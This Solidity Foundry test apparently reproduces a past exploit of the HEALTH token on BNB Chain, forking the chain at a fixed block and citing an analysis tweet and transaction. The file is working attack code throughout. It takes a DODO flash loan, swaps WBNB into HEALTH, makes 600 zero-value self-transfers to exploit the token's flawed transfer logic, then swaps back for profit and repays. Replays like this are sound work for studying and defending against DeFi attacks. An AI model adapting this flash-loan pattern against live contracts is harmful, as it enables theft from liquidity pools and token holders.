// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1583073442433495040
// TX
// https://bscscan.com/tx/0xae8ca9dc8258ae32899fe641985739c3fa53ab1f603973ac74b424e165c66ccf

contract ContractTest is DSTest{
    IERC20 HEALTH = IERC20(0x32B166e082993Af6598a89397E82e123ca44e74E);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xF375709DbdE84D800642168c2e8bA751368e8D32);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 22337425);
    }

    function testExploit() public{
        WBNB.approve(address(Router), type(uint).max);
        HEALTH.approve(address(Router), type(uint).max);
        DVM(dodo).flashLoan(200 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit",
            WBNB.balanceOf(address(this)),
            18
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{

        WBNBToHEALTH();
        for(uint i = 0; i < 600; i++){
            HEALTH.transfer(address(this), 0);
        }
        HEALTHToWBNB();
        WBNB.transfer(dodo, 200 * 1e18);
    }

    function WBNBToHEALTH() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(HEALTH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function HEALTHToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(HEALTH);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            HEALTH.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}